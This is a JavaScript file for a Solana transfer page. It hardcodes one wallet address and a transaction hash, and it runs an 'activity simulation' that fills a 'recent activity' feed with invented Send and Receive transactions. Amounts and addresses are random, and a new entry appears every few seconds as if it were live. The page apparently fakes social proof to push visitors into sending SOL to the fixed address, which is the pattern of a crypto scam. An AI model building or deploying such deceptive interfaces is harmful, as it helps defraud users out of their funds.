// State management
let state = {
    currentTab: 'send',
    showPrivacy: false,
    showTerms: false,
    showReview: false,
    showSuccess: false,
    showSettings: false,
    recentActivity: [],
    copyStatus: {
        address: false,
        hash: false,
        settingsText: false
    }
};

// Constants
const SOLANA_ADDRESS = "5tDkuButLwjZ4GpaaAkYv8exNHc2jdYMhiyE72CepmGk";
const TRANSACTION_HASH = "75f9d706ee0665d1574329788f76004411e5a99b";

// Helper functions
function generateRandomAmount() {
    return (Math.random() * 49.9 + 0.1).toFixed(2);
}

function generateRandomAddress() {
    const chars = '0123456789abcdef';
    let addr = '';
    for (let i = 0; i < 6; i++) {
        addr += chars[Math.floor(Math.random() * chars.length)];
    }
    return `${addr}...${chars.slice(0, 4)}`;
}

function formatTimeAgo(date) {
    const seconds = Math.floor((new Date() - date) / 1000);
    if (seconds < 60) return `${seconds}s ago`;
    if (seconds < 3600) return `${Math.floor(seconds / 60)}m ago`;
    return `${Math.floor(seconds / 3600)}h ago`;
}

// Copy functionality
async function handleCopy(text, type) {
    try {
        await navigator.clipboard.writeText(text);
        state.copyStatus[type] = true;
        updateUI();
        setTimeout(() => {
            state.copyStatus[type] = false;
            updateUI();
        }, 2000);
    } catch (err) {
        console.error('Failed to copy:', err);
    }
}

// Activity simulation
function initializeActivity() {
    state.recentActivity = Array(4).fill(null).map(() => ({
        id: Math.random().toString(36).slice(2, 9),
        type: Math.random() > 0.5 ? 'Send' : 'Receive',
        amount: generateRandomAmount(),
        address: generateRandomAddress(),
        timestamp: new Date(Date.now() - Math.random() * 3600000),
        isNew: false
    }));
    updateUI();
}

function addNewActivity() {
    const newActivity = {
        id: Math.random().toString(36).slice(2, 9),
        type: Math.random() > 0.5 ? 'Send' : 'Receive',
        amount: generateRandomAmount(),
        address: generateRandomAddress(),
        timestamp: new Date(),
        isNew: true
    };

    state.recentActivity = [newActivity, ...state.recentActivity.slice(0, 3)]
        .sort((a, b) => b.timestamp - a.timestamp);

    updateUI();

    setTimeout(() => {
        state.recentActivity = state.recentActivity.map(item =>
            item.id === newActivity.id ? { ...item, isNew: false } : item
        );
        updateUI();
    }, 2000);
}

// UI Updates
function updateUI() {
    // Update tabs
    document.querySelectorAll('.tab').forEach(tab => {
        const tabId = tab.getAttribute('data-tab');
        tab.classList.toggle('active', state.currentTab === tabId);
    });

    // Update modals
    ['Privacy', 'Terms', 'Review', 'Success', 'Settings'].forEach(modalType => {
        const modal = document.getElementById(`${modalType.toLowerCase()}Modal`);
        if (modal) {
            modal.style.display = state[`show${modalType}`] ? 'flex' : 'none';
        }
    });

    // Update recent activity
    const activityContainer = document.getElementById('recentActivity');
    if (activityContainer) {
        activityContainer.innerHTML = state.recentActivity
            .map(activity => `
                <div class="activity-item ${activity.isNew ? 'new' : ''}">
                    <div class="activity-type">${activity.type}</div>
                    <div class="activity-amount">${activity.amount} SOL</div>
                    <div class="activity-time">${formatTimeAgo(activity.timestamp)}</div>
                </div>
            `)
            .join('');
    }
}

// Initialize
document.addEventListener('DOMContentLoaded', () => {
    initializeActivity();
    setInterval(addNewActivity, 5000 + Math.random() * 10000);

    // Event listeners for tabs
    document.querySelectorAll('.tab').forEach(tab => {
        tab.addEventListener('click', () => {
            state.currentTab = tab.getAttribute('data-tab');
            updateUI();
        });
    });

    // Initial UI update
    updateUI();
});
